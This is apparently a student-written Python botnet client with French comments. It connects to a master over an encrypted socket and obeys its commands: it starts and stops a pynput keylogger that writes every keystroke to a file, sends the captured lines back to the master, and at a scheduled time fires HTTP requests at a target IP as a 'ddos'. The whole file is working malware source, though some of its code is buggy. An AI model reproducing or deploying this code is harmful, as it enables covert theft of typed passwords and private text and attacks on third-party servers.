# importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import threading
import time
from datetime import datetime
import argparse
import requests
from cryptography.fernet import Fernet

crypto = Fernet('9FfFyN-Bl1x3U4-MFSTUmX1fbw7kCi0n6DruWTPdBKU=')

"""
creation de l'objet Connexion, composé de 4 champs et 1 méthodes

3ème methode : ces celle qui va se connecter a la machine maitre, elle va se connecter à une machine distante en lui envoyant un message. et va finir
en lançant une boucle pour recevoir des messages en  boucle du maitre jusqu'a qu'il reçoive le emssage fin.

"""


class Connexion():
    # création de l'objet connexion avec le champ adresseMachine
    def __init__(self, adresseMachine, carte_reseau, donnee):
        self.__carte_reseau = carte_reseau
        self._donnee = donnee
        self.__port = port

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au master
    def sendIP(self, carte_reseau, port):
        try:
            # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
            carte_reseau.connect(("localhost", port))
            carte_reseau.send(crypto.encrypt(b"Je me connecte"))
            print("IP envoyée au master")
            donnee = crypto.decrypt(carte_reseau.recv(1024))
            # boucle qui permet de lancer une methode de l'objet communication
            while donnee != "FIN":
                if donnee == "keylogger":
                    print("OK je lance le keylogger")
                    # lance la methode start_log de l'objet Communication
                    thread_log = threading.Thread(target=objet_action.start_log, args=())
                    thread_log.start()
                elif donnee == "stop":
                    print("J'arrête le keylogger")
                    objet_action.stop_log(carte_reseau)
                elif donnee == "transfert":
                    print("J'envoie le keylogger")
                    objet_action.get_log(carte_reseau)
                elif donnee == "ddos":
                    print("on lance le ddos")
                    objet_action.ddos(carte_reseau, )
                donnee = carte_reseau.recv(1024).decode("utf-8")
        except ConnectionRefusedError:
            print("Machine maitre non connecté")


"""
creation de l'objet Action , qui va être enfant de l'objet Connexion, Il est composé
de 5 méthodes et d'un seul champ.

1ère methode et 2ème (start_log, appuie): Ces 2 méthodes vont permettre de lancer le keylogger, start_log va avoir besoin de la méthode
appuie pour fonctionner.

3ème methode (stop_log): va stopper le start_log

4ème methode (get_log): va aller chercher le fichier "keylogger.txt", le mettre à l'envers et prendre le nombre de ligne que veut le maitre,
puis va lui envoyer

5ème methode (ddos): lance une requête http, a une heure et une date donné par le maitre
il fera une petite boucle pour attendre que la date et l'heure soit juste.

"""


class Action(Connexion):

    def __init__(self, chemin, listener):
        # assigne listener à la méthode appuie
        self.chemin = chemin
        self.listener = Listener(on_press=self.appuie)

    def start_log(self):
        try:
            # met les informations de base concernant le logger
            # filename, spécifie le nom du fichier
            # format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier
            logging.basicConfig(filename=(chemin + "\\keyLog.txt"), level=logging.DEBUG,
                                format='%(asctime)s: %(message)s')
            # listener.start va commencer a écouter grace a la methode appuie qui est assigné à la varibale listener
            self.listener.start()
        except FileNotFoundError:
            print("erreur chemin inexistant")

    # Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
    def appuie(self, key):
        logging.info(str(key))

    def stop_log(self, carte_reseau):
        if not self.listener.is_alive():
            carte_reseau.send(crypto.encrypt("Logger non lancé".encode("utf-8")))
            print("erreur")
        else:
            # listener.start va arreter d'écouter en fermant la methode appuie qui est assigné à la varibale listener
            self.listener.stop()
            carte_reseau.send(crypto.encrypt(b"Logger arrete"))
            print("logger arreté")

    def get_log(self, carte_reseau):
        logger = open("D:\\keyLog.txt", "r")
        # lis le fichier ligne à ligne
        fichier = logger.readlines()

        # boucle qui permet de compter le nombre de ligne
        nb_lines = 0
        for line in logger.readlines():
            nb_lines += 1
        # on reçoit le nombre de ligne que le maitre veut récuperer
        lines = (carte_reseau.recv(1024).decode("utf-8"))
        # start définit à partir de quelle ligne il faut commencer, si on peut les 10 dernières lignes on partira
        # de la dernière ligne - 10, et le -1 est pcq il y a un décalage car on part de 0 et non de 1
        start = nb_lines - 1 - int(lines)
        #on utilise l'opérateur de slicing pour démarrer à la ligne souhaitée
        message_get_log = str(fichier[start:])

        carte_reseau.send(message_get_log.encode("utf-8"))

    def ddos(self, carte_reseau):
        # définir le format de la date quand on la rentrera dans la variable
        date = crypto.decrypt(carte_reseau.recv(1024).decode("utf-8"))
        print(date)
        format = "%Y-%m-%d %H:%M"
        # on récupère la date et l'heure actuelle et on la formate comme voulu ci dessus
        now = datetime.strftime(datetime.now(), format)
        print(now)

        ip = crypto.decrypt(carte_reseau.recv(1024).decode("utf-8"))
        url = "http://" + ip
        # on compare la date et l'heure récupérées à celle souhaitée pour le ddos
        while (now != date):
            print("En attente ...")
            time.sleep(10)
            now = datetime.strftime(datetime.now(), format)

        requete = requests.get(url)
        print("Requête : ", requete.text)


thread_log = ""
carte_reseau = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
chemin = ""
port = ""
listener = ""
objet_action = Action(chemin, listener)

# initiation d'argparse avec les arguments
parser = argparse.ArgumentParser()
# creation de la commande --listen
parser.add_argument("--conn", type=int,
                    help="se connecte a une machine distante sur un port donné")
# creation de ala commande --upload
parser.add_argument("--log", type=str,
                    help="on met le chemin ou va être créer le fichier keylog.txt")

# on initie la variable args, qui va contenire les arguments
args = parser.parse_args()
if args.conn:
    port = args.conn
    print(port)
    chemin = args.log
    print(chemin)
    objet_action.sendIP(carte_reseau, port)
